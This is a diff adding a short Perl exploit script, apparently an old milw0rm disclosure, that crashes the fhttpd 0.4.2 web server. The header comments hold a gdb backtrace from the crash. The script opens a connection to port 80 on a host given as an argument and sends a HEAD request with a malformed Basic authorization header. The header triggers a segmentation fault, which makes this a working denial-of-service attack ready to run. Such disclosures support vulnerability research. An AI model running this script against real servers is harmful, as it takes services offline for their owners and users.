@@ -1,0 +1,39 @@
+#!/usr/bin/perl
+#Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]
+
+#http://www.fhttpd.org / fhttpd-0.4.2.tar.gz (WARNING: VERY OLD)
+#Program received signal SIGSEGV, Segmentation fault.
+#0x0804b42d in un64 (s=0x809b2d2 "") at util.cc:69
+
+#69       if(c2!=-2) c3=rptr[3]; else c3=-2;
+#(gdb) bt
+#0  0x0804b42d in un64 (s=0x809b2d2 "") at util.cc:69
+#1  0x080672bf in ControlFTPServerApp::process_get_line (this=0x8089678, 
+#fhttpd.cc:2044
+
+#3  0x08060190 in Wheel::onepass (this=0x8081338) at sockobj.cc:1953
+#4  0x08073c14 in main (argc=1, argv=0xbffff464, env=0xbffff46c) at fhttpd.cc:3645
+#One of the near useless bugs found by my fuzzer with http fuzz capabilities
+
+# Crashes with { } | [ ] \ ; : ' " < > ? , . OR with just a space after Basic:
+
+use IO::Socket;
+
+if(@ARGV < 1)
+{
+
+     print "\nUsage: host\n\n";
+     exit(1);
+
+}
+
+$host    = $ARGV[0];
+$port    = 80;
+
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host, PeerPort=>$port)
+or die "\nError: socket\n\n";
+
+print $sock "HEAD / HTTP/1.1\r\nAuthorization: Basic |\r\n\r\n";
+close($sock);
+
+# milw0rm.com [2008-09-19]
